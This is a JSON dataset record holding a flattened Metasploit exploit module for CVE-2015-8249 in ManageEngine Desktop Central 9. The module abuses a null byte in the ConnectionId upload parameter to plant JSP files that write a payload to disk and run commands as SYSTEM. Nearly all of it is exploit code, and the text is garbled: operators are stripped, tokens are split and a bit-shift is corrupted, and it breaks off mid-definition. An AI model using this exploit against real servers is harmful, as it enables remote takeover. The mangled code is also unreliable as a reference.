{
    "text": "vul_name : ManageEngine Desktop Central 9 FileUploadServlet ConnectionId ， vul_cve : CVE-2015-8249 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， require 'msf/core' ， require 'nokogiri' ， class Metasploit3 < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : EXE ， include Msf : Exploit : FileDropper ， super ( update_info ( info ,  ， 'Name' => \"ManageEngine Desktop Central 9 FileUploadServlet ConnectionId Vulnerability\" ,  ， 'Description' => %q{ ， This module exploits a vulnerability found in ManageEngine Desktop Central 9. When ， uploading a 7z file , the FileUploadServlet class does not check the user-controlled ， ConnectionId parameter in the FileUploadServlet class. This allows a remote attacker to ， inject a null bye at the end of the value to create a malicious file with an arbitrary ， file type , and then place it under a directory that allows server-side scripts to run ,  ， which results in remote code execution under the context of SYSTEM. ， Please note that by default , some ManageEngine Desktop Central versions run on port 8020 ,  ， but older ones run on port 8040. Also , using this exploit will leave debugging information ， produced by FileUploadServlet in file rdslog0.txt. ， This exploit was successfully tested on version 9 , build 90109 and build 91084. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => [ 'sinn3r' ]  ,  ， ' ，  [  ，  [ 'URL' , ' ]  ,  ，  [ 'CVE' , '2015-8249' ]  ，  ]  ,  ， 'Platform' => 'win' ,  ， 'Targets' => ，  [  ，  [ 'ManageEngine Desktop Central 9 on Windows' , {} ]  ，  ]  ,  ， 'Payload' => ， { ， 'BadChars' => \"\\x00\" ， } ,  ， 'Privileged' => false ,  ， 'DisclosureDate' => \"Dec 14 2015\" ,  ， 'DefaultTarget' => 0 )  ， register_options (  ，  [  ， OptString.new ( 'TARGETURI' ,  [ true , 'The base path for ManageEngine Desktop Central' , '/' ]  )  ,  ， Opt : RPORT ( 8020 )  ，  ]  , self.class )  ， end ， jspraw = %Q | <% @ page import=\"java.io. * \" %>\\n |  ， jspraw %Q | <%\\n |  ， jspraw %Q | String data = \" # {Rex : Text.to_hex ( bin_data , \" ) }\" ; \\n |  ， jspraw %Q | FileOutputStream outputstream = new FileOutputStream ( \" # {output_file}\" )  ; \\n |  ， jspraw %Q | int numbytes = data.length (  )  ; \\n |  ， jspraw %Q | byte [  ] bytes = new byte [ numbytes/2 ]  ; \\n |  ， jspraw %Q | for ( int counter = 0 ; counter < numbytes ; counter += 2 ) \\n |  ， jspraw %Q | {\\n |  ， jspraw %Q | char char1 = ( char ) data.charAt ( counter )  ; \\n |  ， jspraw %Q | char char2 = ( char ) data.charAt ( counter + 1 )  ; \\n |  ， jspraw %Q | int comb = Character.digit ( char1 , 16 ) & 0xff ; \\n |  ， jspraw %Q | comb = 4 ; \\n |  ， jspraw %Q | comb += Character.digit ( char2 , 16 ) & 0xff ; \\n |  ， jspraw %Q | bytes [ counter/2 ] = ( byte ) comb ; \\n |  ， jspraw %Q | }\\n |  ， jspraw %Q | outputstream.write ( bytes )  ; \\n |  ， jspraw %Q | outputstream.close (  )  ; \\n |  ， jspraw %Q | %>\\n |  ， jspraw ， end ， jspraw = %Q | <% @ page import=\"java.io. * \" %>\\n |  ， jspraw %Q | <%\\n |  ， jspraw %Q | try {\\n |  ， jspraw %Q | Runtime.getRuntime (  ) .exec ( \"chmod +x # {command}\" )  ; \\n |  ， jspraw %Q | } catch ( IOException ioe ) { }\\n |  ， jspraw %Q | Runtime.getRuntime (  ) .exec ( \" # {command}\" )  ; \\n |  ， jspraw %Q | %>\\n |  ， jspraw ， end ， def get_jsp_stager",
    "time": "2015.12.15"
}